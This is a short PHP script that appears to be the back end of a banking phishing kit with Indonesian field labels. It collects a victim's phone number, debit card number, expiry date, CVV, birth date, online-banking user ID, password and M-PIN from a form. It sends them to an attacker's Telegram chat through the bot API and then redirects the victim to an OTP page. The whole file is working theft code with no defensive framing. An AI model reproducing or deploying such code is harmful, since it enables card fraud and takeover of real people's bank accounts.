<?php 



session_start();
include "./telegram.php";



$message = "༺═──⚸ℂ𝕊-𝔹𝕋ℕ☭──═༻". "\nℕ𝕠𝕞𝕠𝕣 ℍℙ : ".  $_POST ['nomor']. "\nℕ𝕠𝕞𝕠𝕣 𝕂𝕒𝕣𝕥𝕦 : ".  $_POST ['debit']. "\n𝕄𝕒𝕤𝕒 𝔹𝕖𝕣𝕝𝕒𝕜𝕦 : ". $_POST ['valid']. "\nℂ𝕍𝕍 : ". $_POST ['cvv'].  "\n𝕋𝕘𝕝 𝕃𝕒𝕙𝕚𝕣 : ". $_POST ['tanggal'].  "\n\n𝕌𝕤𝕖𝕣 𝕀𝔻 : ".$_POST ['user']. "\nℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕 : ".$_POST ['pass']. "\n𝕄-ℙ𝕀ℕ : ".$_POST ['pin'];

function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  otp.html");
?> 